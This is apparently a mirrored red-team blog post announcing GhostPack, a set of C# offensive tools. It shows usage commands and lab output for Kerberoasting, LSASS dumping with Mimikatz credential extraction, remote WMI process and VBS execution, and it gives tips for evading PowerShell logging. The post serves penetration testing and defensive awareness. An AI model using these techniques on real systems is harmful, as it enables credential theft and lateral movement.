datetime="2018-07-24">2018-07-24</time> · <a href="/en/harmj0y/Red-Teaming/">Red Teaming</a></p><div class="blog-article-body"><p><span>Anyone who has followed myself or my teammates at </span><a href="https://specterops.io/who-we-are/the-team"><span>SpecterOps</span></a><span> for a while knows that we&#8217;re fairly big fans of PowerShell. I&#8217;ve been involved in offensive PowerShell for about 4 years, </span><a href="https://twitter.com/mattifestation"><span>@mattifestation</span></a><span> was the founder of PowerSploit and various defensive projects, </span><a href="https://twitter.com/jaredcatkinson"><span>@jaredcatkinson</span></a><span> has been writing defensive PowerShell for years, and many of my teammates (</span><a href="https://twitter.com/tifkin_"><span>@tifkin_</span></a><span>, </span><a href="https://v/"><span>@enigma0x3</span></a><span>, </span><a href="https://twitter.com/424f424f"><span>rvrsh3ll</span></a><span>, </span><a href="https://twitter.com/xorrior"><span>@xorrior</span></a><span>, </span><a href="https://twitter.com/andrewchiles"><span>@andrewchiles</span></a><span>, and others) have written various security-related PowerShell projects over the past several years, totaling thousands of lines of code.</span></p>
+<p><span>By now, the reason for choosing PowerShell should be fairly self-evident; the language is Turing-complete, built into modern Windows operating systems, and you can do anything with it. Our familiarity with PowerShell and its ubiquity on modern platforms led it to become our language of choice for proof of concepts and </span><a href="https://github.com/harmj0y/DAMP"><span>rapid prototyping</span></a><span>, as well as more fleshed out projects like </span><a href="https://github.com/EmpireProject/Empire"><span>PowerShell Empire</span></a><span>.</span></p>
+<p><span>Then, with the awesome work from the PowerShell team with PowerShell Version 5, everything changed (sort of.) The canonical &#8220;</span><a href="https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/"><span>PowerShell ♥ the Blue Team</span></a><span>&#8221; post from June of 2015 (ironically published one month before Empire was released : ) details all the amazing new security protections integrated into the PowerShell engine, from better transcription, to deep script block logging, AMSI, and more. I had a slight offensive existential crisis when their post dropped, as I felt that a death blow had just been dealt to offensive PowerShell.</span></p>
+<p><span>But guess what? Three years on and we still use PowerShell for many engagements, and the (offensive) sky has not fallen. For nearly every defensive step forward, the offensive community tends to respond in kind. I detailed a bit of this back-and-forth history with security-oriented PowerShell in my &#8220;</span><a href="https://www.slideshare.net/harmj0y/catch-me-if-you-can-powershell-red-vs-blue"><span>Catch Me If You Can: PowerShell Red vs Blue</span></a><span>&#8221; presentation last year at PSConfEU, and </span><a href="https://twitter.com/mattifestation"><span>@mattifestation</span></a><span> details some in depth bypasses for PowerShell-related security controls in our </span><a href="https://specterops.io/how-we-help/training-offerings/adversary-tactics-powershell"><span>Adversary Tactics: PowerShell</span></a><span> course offering.</span></p>
+<p><span>After three years, here are my main two observations on why we&#8217;ve been able to continue to use PowerShell code offensively:</span></p>
+<ul>
+<li><b>The &#8220;Version 2 problem&#8221;:</b><span> sadly, many organizations that have PowerShell Version 5 deployed either do not uninstall PowerShell Version 2, or actually install version 2 for backwards compatibility reasons. Version 2 of PowerShell does not take advantage any of the awesome security protections implemented by the PowerShell team, so if we can coerce this version of the engine to load we have nothing to worry about. This can be done as easily as </span><b>powershell.exe -version 2</b><span>, or we can manually load up any version present when using </span><a href="https://twitter.com/tifkin_"><span>@tifkin_</span></a><span>&#8216;s </span><a href="https://github.com/leechristensen/UnmanagedPowerShell"><span>UnmanagedPowerShell</span></a><span> project. Most places are also not searching for abnormal PowerShell hosts, i.e. the loading of system.management.automation.dll into non-powershell.exe processes.</span></li>
+<li><b>Lack of centralized logging: </b><span>from a scriptblock logging perspective, PowerShell is terrifying to us attackers. As Jeffrey Snover and Lee Holmes mentioned </span><a href="https://www.youtube.com/watch?v=BMreZZ1cgFI"><span>in their 2017 DerbyCon keynote</span></a><span>, &#8220;</span><i><span>We know you have a choice in post-exploitation languages and we&#8217;re glad you chose PowerShell.</span></i><span>&#8221; However, as we&#8217;ve seen, in order for this system to be effective for an environment, a) Windows 10/Server 2016 needs to be widely deployed, b) logging has to be properly enabled on the host level, c) host logs have to be forwarded to a centralized SIEM/analysis platform, d) incident responders have to be paying attention and doing proper analysis on the logs, and e) incident responders have to be able to react within a reasonable amount of time. If any of these parts break down (and they often do in large organizations), red teams and real bad guys can still be quite effective with offensive PowerShell toolkits.</span></li>
+</ul>
+<p><span>We&#8217;re big advocates of what Raphael Mudge termed &#8220;</span><a href="https://blog.cobaltstrike.com/2012/12/05/offense-in-depth/"><span>offense-in-depth</span></a><span>&#8220;. In short, we like to have options in case a single tool or offensive technique fails in a particular environment. We&#8217;ve said for a few years (along with many others) that pivoting to offensive C# makes the most sense when coming from a PowerShell background. While you lose the amazing PowerShell pipeline and the ability to invoke one-liner stubs that load up all code in memory, you retain all access to existing .NET libraries, gain additional weaponization vectors (think </span><a href="https://twitter.com/subtee"><span>@subtee</span></a><span>&#8216;s various app-whitelisting bypass vectors), have a number of additional obfuscation options, and avoid all PowerShell security protections. While there is a bit more overhead in learning to build a C# project instead of a simple PowerShell script, we truly do believe that PowerShell is a great &#8220;gateway drug&#8221; to C#.</span></p>
+<p><span>So with that bit over with, I&#8217;d like to introduce some of what we&#8217;ve been working on over the past few months.</span></p>
+<h1 id="section-1">GhostPack</h1>
+<p><span>GhostPack is (currently) a collection various C# implementations of previous PowerShell functionality, and includes six separate toolsets being released today- </span><a href="https://github.com/GhostPack/Seatbelt/"><span>Seatbelt</span></a><span>, </span><a href="https://github.com/GhostPack/SharpUp/"><span>SharpUp</span></a><span>, </span><a href="https://github.com/GhostPack/SharpRoast/"><span>SharpRoast</span></a><span>, </span><a href="https://github.com/GhostPack/SharpDump/"><span>SharpDump</span></a><span>, </span><a href="https://github.com/GhostPack/SafetyKatz/"><span>SafetyKatz</span></a><span>, and </span><a href="https://github.com/GhostPack/SharpWMI/"><span>SharpWMI</span></a><span>. All of these projects will be hosted on the </span><a href="https://github.com/GhostPack/"><span>GhostPack</span></a><span> GitHub organization, with each project broken out as a separate repository.</span></p>
+<p><span>Quick sidenote: </span><i><span>GhostPack is not intended to be only C# code, nor is it purely offensive</span></i><span>, though the projects released today are all C#. The plan is to have the organization house a number of security-related projects that are not PowerShell. Additionally, to keep defenders from building brittle signatures (think flagging various author&#8217;s Twitter handles : ) we&#8217;re not currently planning to distribute binaries for any of the projects. However, everything is Visual Studio Community 2015 compatible, so it&#8217;s a snap to build yourself.</span></p>
+<p><span>Full disclosure: </span><b>that&#8217;s almost nothing &#8220;new&#8221; here</b><span>, just different implementations of the same techniques many have been using for years. Also, all code here should be considered beta- it&#8217;s had some testing but there are still plenty of bugs to be had :)</span></p>
+<h2 id="section-2">Seatbelt</h2>
+<p><span><a href="https://github.com/GhostPack/Seatbelt/">Seatbelt</a> is by far the meatiest project being released. It&#8217;s a clearinghouse of situational awareness &#8220;safety checks&#8221;. That is, it manages the collection of host data that may be interesting from both offensive and defensive perspectives. Think everything from PowerShell security settings, to current user Kerberos tickets, to deleted Recycle Bin items, and more (40+ current checks!)</span></p>
+<p><span>Seatbelt draws on a TON of existing work, highlighted in the </span><a href="https://github.com/GhostPack/Seatbelt/blob/master/README.md"><span>README.md</span></a><span>, and has already proven itself to be pretty useful on our engagements. It was heavily influenced by </span><a href="https://twitter.com/tifkin_"><span>@tifkin_</span></a><span>&#8216;s </span><a href="https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-HostProfile.ps1"><span>Get-HostProfile.ps1</span></a><span> and </span><a href="https://twitter.com/andrewchiles"><span>@andrewchiles</span></a><span>&#8216; </span><a href="https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1"><span>HostEnum.ps1</span></a><span> PowerShell scripts.</span></p>
+<p><strong>SeatBelt.exe system </strong>collects the following system data:</p>
+<ul>
+<li><strong>BasicOSInfo</strong> &#8211; Basic OS info (i.e. architecture, OS version, etc.)</li>
+<li><strong>RebootSchedule</strong> &#8211; Reboot schedule (last 15 days) based on event IDs 12 and 13</li>
+<li><strong>TokenGroupPrivs</strong> &#8211; Current process/token privileges (e.g. SeDebugPrivilege/etc.)</li>
+<li><strong>UACSystemPolicies</strong> &#8211; UAC system policies via the registry</li>
+<li><strong>PowerShellSettings</strong> &#8211; PowerShell versions and security settings via the registry</li>
+<li><strong>AuditSettings</strong> &#8211; Audit settings via the registry</li>
+<li><strong>WEFSettings</strong> &#8211; Windows Event Forwarding (WEF) settings via the registry</li>
+<li><strong>LSASettings</strong> &#8211; LSA settings (including auth packages)</li>
+<li><strong>UserEnvVariables</strong> &#8211; Current user environment variables</li>
+<li><strong>SystemEnvVariables</strong> &#8211; Current system environment variables</li>
+<li><strong>UserFolders</strong> &#8211; Folders in C:\Users\</li>
+<li><strong>NonstandardServices</strong> &#8211; Services with binary paths not in C:\Windows\</li>
+<li><strong>InternetSettings</strong> &#8211; Internet settings, including proxy configs</li>
+<li><strong>LapsSettings</strong> &#8211; LAPS settings, if installed</li>
+<li><strong>LocalGroupMembers</strong> &#8211; Members of local admins, RDP, and remote DCOM groups</li>
+<li><strong>MappedDrives</strong> &#8211; Currently mapped drives</li>
+<li><strong>RDPSessions</strong> &#8211; Current incoming RDP sessions</li>
+<li><strong>WMIMappedDrives</strong> &#8211; Mapped drives via WMI</li>
+<li><strong>NetworkShares</strong> &#8211; Network shares</li>
+<li><strong>FirewallRules</strong> &#8211; Deny firewall rules, &#8220;full&#8221; dumps all</li>
+<li><strong>AntiVirusWMI</strong> &#8211; Registered antivirus (via WMI)</li>
+<li><strong>InterestingProcesses</strong> &#8211; &#8220;Interesting&#8221; processes- defensive products and admin tools</li>
+<li><strong>RegistryAutoLogon</strong> &#8211; Registry autologon information</li>
+<li><strong>RegistryAutoRuns</strong> &#8211; Registry autoruns</li>
+<li><strong>DNSCache</strong> &#8211; DNS cache entries (via WMI)</li>
+<li><strong>ARPTable</strong> &#8211; Lists the current ARP table and adapter information (equivalent to arp -a)</li>
+<li><strong>AllTcpConnections</strong> &#8211; Lists current TCP connections and associated processes</li>
+<li><strong>AllUdpConnections</strong> &#8211; Lists current UDP connections and associated processes</li>
+<li><strong>NonstandardProcesses</strong> &#8211; Processes with binary paths not in C:\Windows\</li>
+</ul>
+<p>If the user is in high integrity the following additional actions are run:</p>
+<ul>
+<li><strong>SysmonConfig</strong> &#8211; Sysmon configuration from the registry</li>
+</ul>
+<p><strong>SeatBelt.exe user</strong> collects the following user data:</p>
+<ul>
+<li>Checks if Firefox has history files</li>
+<li>Checks if Chrome has history files</li>
+<li><strong>TriageIE</strong> &#8211; Internet Explorer bookmarks and history, last 7 days</li>
+<li><strong>SavedRDPConnections</strong> &#8211; Saved RDP connections, including username hints</li>
+<li><strong>RecentRunCommands</strong> &#8211; Recent &#8220;run&#8221; commands</li>
+<li><strong>PuttySessions</strong> &#8211; Interesting settings from any saved Putty configurations</li>
+<li><strong>PuttySSHHostKeys</strong> &#8211; Saved putty SSH host keys</li>
+<li><strong>RecentFiles</strong> &#8211; Parsed &#8220;recent files&#8221; shortcuts, last 7 days</li>
+</ul>
+<p>If the user is in high integrity, these checks are run for ALL users instead of just the current user.</p>
+<p>Miscellaneous checks:</p>
+<ul>
+<li><strong>CurrentDomainGroups</strong> &#8211; The current user&#8217;s local and domain groups</li>
+<li><strong>Patches</strong> &#8211; Installed patches via WMI (takes a bit on some systems)</li>
+<li><strong>LogonSessions</strong> &#8211; User logon session data</li>
+<li><strong>KerberosTGTData</strong> &#8211; ALL TEH TGTZ!</li>
+<li><strong>InterestingFiles</strong> &#8211; &#8220;Interesting&#8221; files matching various patterns in the user&#8217;s folder</li>
+<li><strong>IETabs</strong> &#8211; Open Internet Explorer tabs</li>
+<li><strong>TriageChrome</strong> &#8211; Chrome bookmarks and history</li>
+<li><strong>TriageFirefox</strong> &#8211; Firefox history (no bookmarks)</li>
+<li><strong>RecycleBin</strong> &#8211; Items in the Recycle Bin deleted in the last 30 days &#8211; only works from a user context!</li>
+<li><strong>KerberosTickets</strong> &#8211; List Kerberos tickets. If elevated, list all grouped by all logon sessions.</li>
+<li><strong>4624Events</strong> &#8211; 4624 logon events from the security event log</li>
+<li><strong>4648Events</strong> &#8211; 4648 explicit logon events from the security event log</li>
+</ul>
+<p><strong>SeatBelt.exe all</strong> will run ALL enumeration checks, can be combined with <strong>full</strong>.</p>
+<p><strong>SeatBelt.exe [CheckName] [CheckName2] &#8230;</strong> will run one or more specified checks only (case-sensitive naming!)</p>
+<p><strong>SeatBelt.exe [system/user/all/CheckName] full</strong> will prevent any filtering and will return complete results. By default, certain checks are filtered (e.g. services NOT in C:\Windows\, etc.)</p>
+<p>Here&#8217;s an example of some of the system collection:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-4579" src="/en/harmj0y/assets/0bfe53067e04-seatbelt_system_output-1024x653.png" alt="" width="1024" height="653" /></p>
+<p><span>There are a TON of checks and interesting information to gather- I definitely recommend you play around with it to see what works for you!</span></p>
+<h2 id="section-3">SharpUp</h2>
+<p><span><a href="https://github.com/GhostPack/SharpUp/">SharpUp</a> is the start of a C# port of </span><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1"><span>PowerUp</span></a><span>&#8216;s privilege escalation checks. Currently, only the most common checks have been ported; no weaponization functions have yet been implemented. The currently implemented checks are:</span></p>
+<ul>
+<li><strong>GetModifiableServices</strong> &#8211; Returns services the current user can modify</li>
+<li><strong>GetModifiableServiceBinaries</strong> &#8211; Returns services with binaries that the current user can modify</li>
+<li><strong>GetAlwaysInstallElevated</strong> &#8211; Returns any values for the AlwaysInstallElevated registry key</li>
+<li><strong>GetPathHijacks</strong> &#8211; Returns any folder in %PATH% that the current user can modify</li>
+<li><strong>GetModifiableRegistryAutoRuns</strong> &#8211; Returns any modifiable binaries/scripts set to run in HKLM auto-runs</li>
+<li><strong>GetSpecialTokenGroupPrivs</strong> &#8211; Returns &#8220;special&#8221; user privileges (e.g. SeDebugPrivilege/etc.)</li>
+<li><strong>GetUnattendedInstallFiles</strong> &#8211; Returns any left over unattended install files</li>
+<li><strong>GetMcAfeeSitelistFiles</strong> &#8211; Returns any McAfee SiteList.xml file locations</li>
+</ul>
+<p>Here&#8217;s an example of its output:</p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpUp.exe
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+
+
+=== Modifiable Services ===
+
+Name             : VulnSvc
+DisplayName      : VulnSvc
+Description      :
+State            : Stopped
+StartMode        : Auto
+PathName         : C:\Program Files\VulnSvc\VulnSvc.exe
+
+
+=== Modifiable Service Binaries ===
+
+Name             : VulnSvc2
+DisplayName      : VulnSvc22
+Description      :
+State            : Stopped
+StartMode        : Auto
+PathName         : C:\VulnSvc2\VulnSvc2.exe
+
+
+=== AlwaysInstallElevated Registry Keys ===
+
+
+
+=== Modifiable Folders in %PATH% ===
+
+Modifable %PATH% Folder  : C:\Go\bin
+
+
+=== Modifiable Registry Autoruns ===
+
+
+
+=== *Special* User Privileges ===
+
+
+
+=== Unattended Install Files ===
+
+
+
+=== McAfee Sitelist.xml Files ===
+
+
+
+[*] Completed Privesc Checks in 18 seconds</pre>
+<h2 id="section-4">SharpRoast</h2>
+<p class="p1"><span><a href="https://github.com/GhostPack/SharpRoast/">SharpRoast</a> is a C# port of various </span><a href="https://github.com/PowerShellMafia/PowerSploit/blob/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1#L2574-L2774"><span>PowerView&#8217;s Kerberoasting functionality</span></a><span>. The </span><a href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx"><span>KerberosRequestorSecurityToken.GetRequest Method()</span></a> <span>method used was contributed to PowerView by </span><a href="https://twitter.com/machosec"><span>@machosec</span></a><span>. The hashes are output in </span><a href="https://hashcat.net/hashcat/"><span>hashcat</span></a><span> format.</span></p>
+<p><span>For more information on Kerberoasting, including links to Tim Medin&#8217;s original talk on the subject, check out my &#8220;</span><a href="/en/harmj0y/Powershell/kerberoasting-without-mimikatz/"><span>Kerberoasting Without Mimikatz</span></a><span>&#8221; post from November, 2016.</span></p>
+<p>To r<span>oast all users in the current domain:</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe all
+SamAccountName         : harmj0y
+DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+ServicePrincipalName   : asdf/asdfasdf
+Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...
+
+SamAccountName         : sqlservice
+DistinguishedName      : CN=SQL,CN=Users,DC=testlab,DC=local
+ServicePrincipalName   : MSSQLSvc/SQL.testlab.local
+Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.testlab.local*$9994D1...
+
+...</pre>
+<p>To r<span>oast a specific SPN in the current domain:</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe "asdf/asdfasdf"
+Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...</pre>
+<div>
+<div>
+<p>To r<span>oast a specific user in the current domain:</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe harmj0y
+SamAccountName         : harmj0y
+DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+ServicePrincipalName   : asdf/asdfasdf
+Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...</pre>
+</div>
+<div>To roast users from a specified OU in the current domain:</div>
+<div>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe "OU=TestingOU,DC=testlab,DC=local"
+SamAccountName         : testuser2
+DistinguishedName      : CN=testuser2,OU=TestingOU,DC=testlab,DC=local
+ServicePrincipalName   : service/host
+Hash                   : $krb5tgs$23$*$testlab.local$service/host*$08A6462...</pre>
+<div>
+<div>To roast a specific specific SPN in another (trusted) domain:</div>
+</div>
+</div>
+</div>
+<pre class="lang:default decode:true">C:\Temp\&gt;SharpRoast.exe "MSSQLSvc/SQL@dev.testlab.local"
+Hash                   : $krb5tgs$23$*user$DOMAIN$MSSQLSvc/SQL@dev.testlab.local*$9994D148...</pre>
+<p>To r<span>oast all users in another (trusted) domain:</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe "LDAP://DC=dev,DC=testlab,DC=local"
+SamAccountName         : jason
+DistinguishedName      : CN=jason,CN=Users,DC=dev,DC=testlab,DC=local
+ServicePrincipalName   : test/test
+Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test*$9129566
+
+...</pre>
+<p>Any of these commands also accept a [domain.com\user] [password] for to roast with explicit credentials. For example:</p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpRoast.exe harmj0y "testlab.local\dfm" "Password123!"
+SamAccountName         : harmj0y
+DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
+ServicePrincipalName   : asdf/asdfasdf
+Hash                   : $krb5tgs$23$*$testlab.local$asdf/asdfasdf*$14AA4F...
+</pre>
+<p>This can be useful if you&#8217;re encountering a double-hop type of situation.</p>
+<h2 id="section-5">SharpDump</h2>
+<p><span><a href="https://github.com/GhostPack/SharpDump/">SharpDump</a> is a essentially C# port of various </span><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1"><span>PowerSploit&#8217;s Out-Minidump.ps1</span></a><span> functionality. The </span><a href="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump"><span>MiniDumpWriteDump</span></a><span> Win32 API call is used to create a mini-dump for the process ID specified (LSASS by default) to C:\Windows\Temp\debug&lt;PID&gt;.out, GZipStream is used to compress the dump to C:\Windows\Temp\debug&lt;PID&gt;.bin (.gz format), and the original minidump file is deleted.</span></p>
+<p>To dump LSASS (the default):</p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpDump.exe
+
+[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug808.out
+[+] Dump successful!
+
+[*] Compressing C:\WINDOWS\Temp\debug808.out to C:\WINDOWS\Temp\debug808.bin gzip file
+[*] Deleting C:\WINDOWS\Temp\debug808.out
+
+[+] Dumping completed. Rename file to "debug808.gz" to decompress.
+
+[*] Operating System : Windows 10 Enterprise N
+[*] Architecture     : AMD64
+[*] Use "sekurlsa::minidump debug.out" "sekurlsa::logonPasswords full" on the same OS/arch
+</pre>
+<p>To dump a specific process ID:</p>
+<pre class="lang:default decode:true">C:\Temp&gt;SharpDump.exe 8700
+
+[*] Dumping notepad++ (8700) to C:\WINDOWS\Temp\debug8700.out
+[+] Dump successful!
+
+[*] Compressing C:\WINDOWS\Temp\debug8700.out to C:\WINDOWS\Temp\debug8700.bin gzip file
+[*] Deleting C:\WINDOWS\Temp\debug8700.out
+
+[+] Dumping completed. Rename file to "debug8700.gz" to decompress.</pre>
+<p>If dumping LSASS, this compressed minidump can then be downloaded, renamed to dump&lt;PID&gt;.gz, extracted, and run through Mimikatz&#8217; <strong>sekurlsa::minidump</strong> functionality on a similar platform:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-4575" src="/en/harmj0y/assets/32e6d8c3a0e9-mimikatz_minidump-1024x708.png" alt="" width="1024" height="708" /></p>
+<h2 id="section-6">SafetyKatz</h2>
+<p><span><a href="https://github.com/GhostPack/SafetyKatz/">SafetyKatz</a> is a combination of SharpDump, </span><a href="https://twitter.com/gentilkiwi"><span>@gentilkiwi</span></a><span>&#8216;s </span><a href="https://github.com/gentilkiwi/mimikatz/"><span>Mimikatz project</span></a><span>, and </span><a href="https://twitter.com/subtee"><span>@subtee</span></a><span>&#8216;s </span><a href="https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs"><span>.NET PE loader</span></a><span>.</span></p>
+<p><span>First, the </span><a href="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump"><span>MiniDumpWriteDump</span></a><span> Win32 API call is used to create a mini-dump of LSASS to C:\Windows\Temp\debug.bin. Then @subtee&#8217;s PELoader is used to load a customized version of Mimikatz that runs </span><b>sekurlsa::logonpasswords </b><span>and </span><b>sekurlsa::ekeys</b><span> on the minidump file, removing the file after execution is complete. This allows you to extract passwords from a system without having to transport the multi-megabyte minidump file, but prevents the Mimikatz&#8217; <em>specific</em> OpenProcess attach to LSASS.</span></p>
+<pre class="lang:default decode:true">C:\Temp&gt;SafetyKatz.exe
+
+[*] Dumping lsass (808) to C:\WINDOWS\Temp\debug.bin
+[+] Dump successful!
+
+[*] Executing loaded Mimikatz PE
+
+.#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!
+.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+## / \ ##  / *** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+'#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   *** /
+
+mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...
+
+Authentication Id : 0 ; 28935082 (00000000:01b983aa)
+Session           : Interactive from 0
+User Name         : blahuser
+Domain            : WINDOWS10
+Logon Server      : WINDOWS10
+Logon Time        : 7/15/2018 1:07:55 PM
+SID               : S-1-5-21-1473254003-2681465353-4059813368-1002
+        msv :
+        [00000003]
+Primary
+        * Username : blahuser
+        * Domain   : WINDOWS10
+
+...(snip)...
+
+mimikatz # deleting C:\Windows\Temp\debug.bin</pre>
+<h2 id="section-7">SharpWMI</h2>
+<p><span>The last small tool (<a href="https://github.com/GhostPack/SharpWMI/">SharpWMI</a>) is a simple C# wrapper for various WMI functionality. It allows for generic remote (or local) WMI querying, remote process execution through Win32_Process, and remote VBS execution through &#8220;temporarily&#8221; permanent WMI event subscriptions.</span></p>
+<pre class="lang:default decode:true">Local system enumeration  :
+    SharpWMI.exe action=query query="select * from win32_service" [namespace=BLAH]
+    Ex: SharpWMI.exe action=query query="select * from win32_process"
+    Ex: SharpWMI.exe action=query query="SELECT * FROM AntiVirusProduct" namespace="root\SecurityCenter2"
+
+Remote system enumeration :
+    SharpWMI.exe action=query computername=HOST1[,HOST2,...] query="select * from win32_service" [namespace=BLAH]
+    Ex: SharpWMI.exe action=query computername=primary.testlab.local query="select * from win32_service"
+    Ex: SharpWMI.exe action=query computername=primary,secondary query="select * from win32_process
+
+Remote process creation   :
+    SharpWMI.exe action=create computername=HOST[,HOST2,...] command="C:\temp\process.exe [args]"
+    Ex: SharpWMI.exe action=create computername=primary.testlab.local command="powershell.exe -enc ZQBj..."
+
+Remote VBS execution      :
+    SharpWMI.exe action=executevbs computername=HOST[,HOST2,...]
+    Ex: SharpWMI.exe action=executevbs computername=primary.testlab.local
+</pre>
+<p><span>Nothing revolutionary here, but the WMI event subscription approach has served us well. A timer-based event subscription is created on the remote system with arbitrary VBS as the ActiveScriptEventConsumer payload. The event triggers, your VBS is executed, and everything is cleaned up:</span></p>
+<pre class="lang:default decode:true ">C:\Temp&gt;SharpWMI.exe action=executevbs computername=primary.testlab.local
+
+[*] Creating 'Timer' object on primary.testlab.local
+[*] Setting 'Debug' event filter on primary.testlab.local
+[*] Setting 'Debug' event consumer on primary.testlab.local
+[*] Binding 'Debug' event filter and consumer on primary.testlab.local
+
+[*] Waiting 45 seconds for event to trigger on primary.testlab.local ...
+
+[*] Removing 'Timer' internal timer from primary.testlab.local
+[*] Removing FilterToConsumerBindingr from primary.testlab.local
+[*] Removing 'Debug' event filter from primary.testlab.local
+[*] Removing 'Debug' event consumer from primary.testlab.local</pre>
+<p><span>The filter/consumer name can be modified with the </span><b>eventname=BLAH </b><span>argument. If you want to change the VBS executed, modify the </span><b>vbsPayload </b><span>string at the top of the project before compiling. </span><a href="https://github.com/tyranid/DotNetToJScript"><span>DotNetToJScript</span></a><span> works great here ;)</span></p>
+<h1 id="section-8">Wrapup</h1>
+<p><span>We hope that others find this code helpful, and we encourage any on the fence about C# development to take the plunge! I was a bit apprehensive about starting the C# development for this codebase, but after the first few days I realized how easy it was to transition from PowerShell. Also, I want to reiterate that security-oriented PowerShell is not &#8220;dead&#8221; from our perspective- we will still continue to use it, but again we like to have diversity in our toolsets.</span></p>
+<p><span>We have a few more tools and modifications that will be pushed out over the next few months, so expect the repositories to stay active. A follow-up post in the next few weeks will cover a few C# weaponization specifics, but until then, have fun!</span></p>
+</div><footer class="article-source" id="original-source"><p>Original article by harmj0y</p><a href="https://blog.harmj0y.net/redteaming/ghostpack/" rel="author external">GhostPack — blog.harmj0y.net ↗</a></footer></article><nav class="page-navigation" aria-label="Previous and next page"><a href="/en/harmj0y/Red-Teaming/operational-guidance-for-offensive-user-dpapi-abuse/" rel="prev"><small>Previous</small>Operational Guidance for Offensive User DPAPI Abuse</a><a href="/en/harmj0y/ActiveDirectory/a-guide-to-attacking-domain-trusts/" rel="next"><small>Next</small>A Guide to Attacking Domain Trusts</a></nav></main><aside class="page-outline" aria-label="On this page"><p class="eyebrow">On this page</p><nav id="page-toc"><a href="#article-title">GhostPack</a><a href="#section-1">GhostPack</a><a href="#section-2" class="toc-sub">Seatbelt</a><a href="#section-3" class="toc-sub">SharpUp</a><a href="#section-4" class="toc-sub">SharpRoast</a><a href="#section-5" class="toc-sub">SharpDump</a><a href="#section-6" class="toc-sub">SafetyKatz</a><a href="#section-7" class="toc-sub">SharpWMI</a><a href="#section-8">Wrapup</a></nav><a class="back-top" href="#top">Back to top ↑</a></aside></div>
+<footer class="site-footer"><span>Raw2Crawl · Security documentation</span></footer>
+</body></html>
